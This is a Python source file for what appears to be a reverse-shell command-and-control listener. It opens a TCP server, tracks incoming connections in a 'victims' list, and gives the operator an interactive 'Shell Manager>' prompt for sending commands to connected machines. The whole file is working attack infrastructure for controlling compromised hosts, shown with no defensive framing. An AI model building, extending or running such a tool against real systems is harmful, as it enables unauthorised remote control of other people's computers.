import shell
import victims
import argparse
import socket
import threading
from colorama import Fore, Back, Style
import sys

def connection(addr):
    print("")
    print(Fore.GREEN+"Connection received from "+str(addr)+". Press Enter to Continue"+Style.RESET_ALL)

def on_new_client(conn, addr):
    addr = str(addr).split(',')
    addr = addr[0]
    addr = addr[2:]
    addr = addr[:-1]
    if victims.VICTIM_CTR == 0:
        victims.VICTIM_CTR+=1
        victims.VICTIM_LIST[0]['IP'] = str(addr)
        victims.VICTIM_LIST[0]['ID'] = 1
        victims.VICTIM_LIST[0]['CONN'] = conn
        
    
    else:
        is_there = 0
        for connections in victims.VICTIM_LIST:
            if connections["IP"] == str(addr):
                is_there = 1
        if is_there == 0:
            victims.VICTIM_CTR+=1
            victims.VICTIM_LIST[victims.VICTIM_CTR - 1]['IP'] = str(addr)
            victims.VICTIM_LIST[victims.VICTIM_CTR - 1]['ID'] = victims.VICTIM_CTR
            victims.VICTIM_LIST[victims.VICTIM_CTR - 1]['CONN'] = conn 
            connection(addr)
    

def create_server(ip, port):
    # Create listener
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((str(ip), int(port)))
    s.listen(5)
    
    while 1:
        conn, addr = s.accept()
        th = threading.Thread(target=on_new_client, args=(conn, addr))
        th.daemon = True
        th.start() 


def listen(ip, port):
    #Create Thread to start server
    th = threading.Thread(target=create_server, args=(str(ip), int(port)))
    th.daemon = True
    th.start()    
    
            


def main():
    parser = argparse.ArgumentParser()

    parser.add_argument("-p", "--port", action="store", help = "Server port", type = int, required=True)    
    parser.add_argument("-s", "--server", action="store", help = "Server IP Address", required=True)

    args = parser.parse_args()
    listen(args.server, args.port)
    print(Fore.GREEN+"Listening on "+args.server+" on port "+str(args.port)+Style.RESET_ALL)

    '''Command Shell'''
    while 1:
        user_input = input("Shell Manager> ")
        if user_input == " " or user_input == " ":
            command = " "
            shell.get_command(command, user_input)
        elif len(user_input) == 0:
            pass
        else:
            user_input = user_input.split()
            command = user_input[0]
            user_input.pop(0)
            shell.get_command(command, user_input)

if __name__ == "__main__":
    victims.init()
    main()